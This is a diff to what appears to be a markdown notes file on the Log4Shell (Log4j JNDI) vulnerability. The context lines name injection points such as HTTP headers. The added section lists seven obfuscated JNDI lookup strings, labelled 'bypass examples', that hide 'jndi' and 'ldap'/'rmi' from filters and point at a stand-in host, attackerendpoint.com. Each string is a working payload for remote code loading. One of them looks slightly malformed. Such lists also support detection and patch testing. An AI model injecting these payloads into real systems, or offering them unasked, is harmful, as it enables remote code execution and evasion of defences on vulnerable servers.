@@ -33,3 +33,19 @@
 #### 3) HTTP headers such as User-Agent, X-Forwarded-For, X-ApiVersion, or other customizable headers
 
 #### 4) Any place for user-supplied data
+
+## Bypass examples:
+
+#### 1) ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+
+#### 2) ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+
+#### 3) ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+
+#### 4) ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+
+#### 5) ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+
+#### 6) ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+
+#### 7) ${${::-j}ndi:rmi://attackerendpoint.com/}
